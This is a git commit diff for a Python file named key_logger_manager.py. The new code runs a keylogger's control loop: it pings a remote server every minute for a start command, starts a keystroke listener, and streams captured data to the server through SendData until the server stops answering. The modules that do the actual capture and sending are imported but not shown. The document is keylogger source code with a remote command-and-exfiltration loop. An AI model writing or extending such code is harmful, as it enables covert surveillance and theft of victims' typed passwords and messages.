32212c2aa2fe209748faf0f621eed15d950b8896
YosefGu <yos770yos@gmail.com>
2025-02-20 09:57:22 +0200

    Updating the  magager file to new architecture

--- engin/key_logger_manager.py
+++ engin/key_logger_manager.py
@@ -1,16 +1,34 @@
+import time
+from send_ping import SendPing
+from send_data import SendData
 from key_logger_service import KeyLoggerService
 
 
 class KeyLoggerManager:
 
-
-    def __init__(self, run_time):
-        self.service = KeyLoggerService(run_time)
+    def __init__(self):
+        self.service = KeyLoggerService()
 
 
     def start_key_logger(self):
-        self.service.start_monitoring()
+        self.service.start_listener()
+        while True:
+            generator = self.service.send_every_minute()
+            for data in generator:
+                server_commend = SendData(data).send()
+                if not server_commend:
+                    self.service.stop_listener()
+                    return False
 
+    def start(self):
+        is_listening = False
+        while True:
+            if not is_listening:
+                commend_to_start = SendPing().send()
+                if commend_to_start:
+                    is_listening = self.start_key_logger()
+            time.sleep(60)    
+        
 if __name__ == "__main__":
-    manager = KeyLoggerManager(1)
-    manager.start_key_logger()
+    manager = KeyLoggerManager()
+    manager.start()
